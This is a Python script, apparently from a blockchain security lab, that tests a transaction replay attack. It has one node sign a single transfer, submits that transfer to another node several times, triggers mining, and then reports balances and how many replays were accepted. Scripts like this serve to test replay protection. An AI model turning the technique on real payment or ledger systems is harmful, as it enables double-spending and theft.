# attack/replay_attack.py
import argparse
import time
import requests


def jget(url: str, timeout=8.0):
    r = requests.get(url, timeout=timeout)
    r.raise_for_status()
    return r.json()


def jpost(url: str, payload, timeout=15.0, retries=2, sleep_s=0.4):
    last = None
    for _ in range(retries):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            js = None
            if "application/json" in r.headers.get("Content-Type", ""):
                js = r.json()
            return r.status_code, js, r.text
        except Exception as e:
            last = e
            time.sleep(sleep_s)
    raise last


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--nodeA", required=True)
    p.add_argument("--nodeB", required=True)
    p.add_argument("--amount", type=int, default=5)
    p.add_argument("--replays", type=int, default=5)
    args = p.parse_args()

    A = args.nodeA.rstrip("/")
    B = args.nodeB.rstrip("/")

    ida = jget(A + "/identity", timeout=8.0)
    idb = jget(B + "/identity", timeout=8.0)

    a_addr = ida["address"]
    b_addr = idb["address"]

    print(f"[INFO] A (miner) address: {a_addr}")
    print(f"[INFO] B (attacker) address: {b_addr}")

    print("[INFO] Creating ONE signed tx on B (B -> A) ...")
    sc, js, txt = jpost(B + "/local/make_tx", {"to": a_addr, "value": args.amount}, timeout=15.0, retries=2)
    print(sc, txt)
    if sc != 200 or not js or "tx" not in js:
        print("[ERR] Could not create tx on B.")
        return

    tx = js["tx"]

    print("\n[OK] Got signed tx. Replaying the exact same tx payload...")
    accepted = 0
    for i in range(args.replays):
        sc2, js2, txt2 = jpost(A + "/tx/new", tx, timeout=15.0, retries=2)
        print(f"[REPLAY {i+1}] {sc2} {txt2}")
        if sc2 == 200 and isinstance(js2, dict) and js2.get("msg") == "accepted":
            accepted += 1
        time.sleep(0.15)

    # Mine a few times
    for j in range(min(args.replays, 10)):
        sc3, js3, txt3 = jpost(A + "/mine", {}, timeout=60.0, retries=2)
        print(f"[MINE {j+1}] {sc3} {txt3}")
        time.sleep(0.15)

    balA = jget(A + f"/balance/{a_addr}", timeout=10.0)
    balB = jget(A + f"/balance/{b_addr}", timeout=10.0)

    print("\n[RESULT] Balances as seen by node A:")
    print("  balance(A) =", balA.get("balance"))
    print("  balance(B) =", balB.get("balance"))
    print(f"\n[INFO] Replays accepted (real): {accepted}/{args.replays}")


if __name__ == "__main__":
    main()
